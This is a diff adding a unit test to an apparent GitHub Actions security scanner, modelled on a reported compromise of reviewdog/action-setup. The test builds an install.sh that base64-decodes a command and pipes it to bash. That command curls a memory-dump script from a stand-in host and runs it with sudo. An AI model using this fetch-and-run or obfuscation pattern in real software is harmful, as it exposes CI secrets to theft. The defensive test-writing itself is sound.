@@ -211,6 +211,19 @@ class ScanActionTests(unittest.TestCase):
         self.assertEqual((res["verdict"], counted(res)), ("SUSPICIOUS", [("SC-IMPORT-RISK", "CRITICAL", "dist/index.js", 6)]))
         self.assertIn("runs when the action runs (runs.main)", res["issues"][0]["msg"])
 
+    def test_the_reviewdog_shape(self):
+        # what reviewdog/action-setup's install.sh carried in March 2025, made inert: a script kept in base64, decoded and
+        # piped into bash, which fetched a Python script and ran it with sudo
+        inner = b"curl -sSf https://gist.example.invalid/memdump.py | sudo python3 | tr -d '\\0' | base64 -w 0"
+        script = "#!/bin/sh\nset -e\necho '" + base64.b64encode(inner).decode() + "' | base64 -d | bash\n"
+        res = scan({"action.yml": composite("$GITHUB_ACTION_PATH/install.sh"), "install.sh": script})
+        self.assertEqual((res["verdict"], counted(res)), ("SUSPICIOUS", [("SC-INSTALL-HOOK", "CRITICAL", "action.yml", 7)]))
+        self.assertIn("runs install.sh, which pipes code it decodes into bash", res["issues"][0]["msg"])
+        # what it decoded, run as it is: a script fetched and run, MAJOR in an action
+        res = scan({"action.yml": composite("$GITHUB_ACTION_PATH/install.sh"), "install.sh": "#!/bin/sh\n" + inner.decode() + "\n"})
+        self.assertEqual(counted(res), [("SC-INSTALL-HOOK", "MAJOR", "action.yml", 7)])
+        self.assertIn("downloads a script and runs it with python3", res["issues"][0]["msg"])
+
     def test_a_docker_action(self):
         yml = fx.action_yml("docker", image="docker/Dockerfile", entrypoint="/srv/entry.sh")
         res = scan({"action.yml": yml, "docker/Dockerfile": "FROM node:22\nCOPY . /srv\nENTRYPOINT [\"node\", \"/srv/app.js\"]\n",
